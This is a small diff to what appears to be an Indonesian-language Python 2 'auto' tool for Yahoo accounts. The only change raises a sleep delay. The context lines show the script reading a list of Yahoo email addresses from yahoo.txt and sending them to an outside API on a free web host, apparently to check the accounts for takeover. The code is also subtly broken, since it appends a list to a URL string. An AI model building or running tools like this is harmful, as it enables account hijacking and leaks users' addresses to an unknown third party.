@@ -27,7 +27,7 @@ print "\033[93mMau Auto apa kgaa?\n 1). Ya\n 2). Tidak"
 putput = raw_input("input --> \033[95m")
 if putput == "1":
    print "Masukan Akun - akun yahoo mu ke txt yg tersedia"
-   time.sleep(0.4)
+   time.sleep(4)
    aerr = open("yahoo.txt", "r")
    ct = aerr.read().splitlines() 
    r = requests.get("http://widhitools.000webhostapp.com/api/yahoo.php?email="+ct)
